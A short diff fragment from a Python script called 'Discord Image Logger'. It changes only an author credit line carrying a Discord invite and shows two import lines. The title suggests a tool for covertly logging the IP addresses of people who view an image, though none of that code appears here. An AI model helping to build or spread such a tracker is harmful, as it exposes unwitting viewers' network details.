@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By ai4u and abood | https://discord.gg/4jwvFs4Q
+# By ai4u and abood! | https://discord.gg/4jwvFs4Q
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
